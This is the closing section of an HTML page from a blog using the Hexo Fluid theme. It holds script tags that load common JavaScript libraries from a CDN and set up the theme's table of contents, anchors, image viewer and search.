      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init(Object.assign({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      scrollSmooth    : true,
      includeTitleTags: true,
      headingsOffset  : -boardTop,
    }, CONFIG.toc));
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }

    Fluid.events.registerRefreshCallback(function() {
      if ('tocbot' in window) {
        tocbot.refresh();
        var toc = jQuery('#toc');
        if (toc.length === 0 || !tocbot) {
          return;
        }
        if (toc.find('.toc-list-item').length > 0) {
          toc.css('visibility', 'visible');
        }
      }
    });
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));

    Fluid.events.registerRefreshCallback(function() {
      if ('anchors' in window) {
        anchors.removeAll();
        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
        var res = [];
        for (var item of el) {
          res.push('.markdown-body > ' + item.trim());
        }
        if (CONFIG.anchorjs.placement === 'left') {
          anchors.options.class = 'anchorjs-link-left';
        }
        anchors.add(res.join(', '));
      }
    });
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  <script  src="/js/local-search.js" ></script>





<!-- 主题的启动项，将它保持在最底部 -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
  </noscript>
</body>
</html>
